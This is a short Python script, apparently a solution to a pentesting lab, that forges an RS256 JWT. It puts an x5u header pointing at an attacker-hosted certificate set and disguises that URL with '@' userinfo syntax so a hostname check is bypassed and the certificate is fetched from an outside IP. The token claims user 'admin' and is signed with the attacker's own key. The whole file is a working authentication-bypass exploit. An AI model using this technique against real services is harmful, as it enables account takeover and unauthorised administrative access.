import OpenSSL
from OpenSSL import crypto, SSL
import base64
import json
import datetime
from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding

f = open("private.pem", "r")
key_pem = f.read()

key = OpenSSL.crypto.load_privatekey(crypto.FILETYPE_PEM, key_pem).to_cryptography_key()
print(key)
header = {"typ":"JWT","alg":"RS256","x5u":"http://ptl-5cc9b966-853bef94.libcurl.so@35.177.10.59/x509/jwks.json"}
payload = {"user":"admin"}

payload64 = base64.urlsafe_b64encode(bytes(json.dumps(payload), encoding='utf-8')).decode('utf-8').rstrip('=')
header64 = base64.urlsafe_b64encode(bytes(json.dumps(header), encoding='utf-8')).decode('utf-8').rstrip('=')

str = header64+'.'+payload64

sig = key.sign(bytes(str, encoding='utf-8'), algorithm=hashes.SHA256(), padding=padding.PKCS1v15())
print(str+'.'+base64.urlsafe_b64encode(sig).decode('utf-8').rstrip('='))
